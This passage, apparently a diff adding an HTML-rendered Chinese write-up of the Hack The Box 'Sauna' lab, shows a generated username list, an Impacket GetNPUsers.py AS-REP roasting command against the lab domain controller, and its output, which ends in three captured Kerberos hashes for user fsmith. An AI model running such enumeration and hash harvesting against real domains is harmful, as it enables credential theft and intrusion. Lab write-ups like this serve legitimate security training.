+</span></span><span style="display:flex;"><span>Taylor
+</span></span><span style="display:flex;"><span>btaylor
+</span></span><span style="display:flex;"><span>BTaylor
+</span></span><span style="display:flex;"><span>Btaylor
+</span></span><span style="display:flex;"><span>taylorb
+</span></span><span style="display:flex;"><span>bowie.taylor
+</span></span><span style="display:flex;"><span>Bowie.Taylor
+</span></span><span style="display:flex;"><span>bowietaylor
+</span></span><span style="display:flex;"><span>BowieTaylor
+</span></span><span style="display:flex;"><span>b.taylor
+</span></span><span style="display:flex;"><span>B.Taylor
+</span></span><span style="display:flex;"><span>sophie
+</span></span><span style="display:flex;"><span>Sophie
+</span></span><span style="display:flex;"><span>driver
+</span></span><span style="display:flex;"><span>Driver
+</span></span><span style="display:flex;"><span>sdriver
+</span></span><span style="display:flex;"><span>SDriver
+</span></span><span style="display:flex;"><span>Sdriver
+</span></span><span style="display:flex;"><span>drivers
+</span></span><span style="display:flex;"><span>sophie.driver
+</span></span><span style="display:flex;"><span>Sophie.Driver
+</span></span><span style="display:flex;"><span>sophiedriver
+</span></span><span style="display:flex;"><span>SophieDriver
+</span></span><span style="display:flex;"><span>s.driver
+</span></span><span style="display:flex;"><span>S.Driver
+</span></span><span style="display:flex;"><span>steven
+</span></span><span style="display:flex;"><span>Steven
+</span></span><span style="display:flex;"><span>kerb
+</span></span><span style="display:flex;"><span>Kerb
+</span></span><span style="display:flex;"><span>skerb
+</span></span><span style="display:flex;"><span>SKerb
+</span></span><span style="display:flex;"><span>Skerb
+</span></span><span style="display:flex;"><span>kerbs
+</span></span><span style="display:flex;"><span>steven.kerb
+</span></span><span style="display:flex;"><span>Steven.Kerb
+</span></span><span style="display:flex;"><span>stevenkerb
+</span></span><span style="display:flex;"><span>StevenKerb
+</span></span><span style="display:flex;"><span>s.kerb
+</span></span><span style="display:flex;"><span>S.Kerb
+</span></span></code></pre></div><p>执行爆破。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass  -dc-ip 10.129.22.120 egotistical-bank.local/ -usersfile users.txt
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User administrator doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Administrator doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span style="color:#f92672">(</span>Clients credentials have been revoked<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span style="color:#f92672">(</span>Clients credentials have been revoked<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c
+</span></span><span style="display:flex;"><span>$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08
+</span></span><span style="display:flex;"><span>$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
